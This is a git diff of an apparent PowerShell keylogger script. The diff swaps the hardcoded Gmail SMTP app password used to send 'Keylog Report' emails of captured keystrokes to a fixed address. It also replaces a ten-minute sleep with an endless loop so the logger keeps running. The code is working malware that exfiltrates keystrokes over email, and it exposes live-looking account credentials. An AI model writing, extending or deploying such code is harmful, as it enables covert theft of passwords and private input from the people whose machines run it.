@@ -86,7 +86,7 @@ Register-ObjectEvent -InputObject $EmailTimer -EventName Elapsed -Action {
         $smtpFrom   = "testingkl2025@gmail.com"
         $smtpTo     = "testingkl2025@gmail.com"
         $smtpUser   = "testingkl2025@gmail.com"
-        $smtpPass   = "jlockpwdntkqdcn" 
+        $smtpPass   = "qtpqqpkesdhxiofs" 
         $subject    = "Keylog Report - $(Get-Date -Format 'g')"
         $body       = "Attached are the recent keystrokes."
 
@@ -105,6 +105,7 @@ Register-ObjectEvent -InputObject $EmailTimer -EventName Elapsed -Action {
 }
 
 Write-Host "[*] Sleeping for 10 minutes to allow email timer to trigger..."
-Start-Sleep -Seconds 600
+while ($true) { Start-Sleep -Seconds 1 }
+
 
 [KeyLogger]::Start()
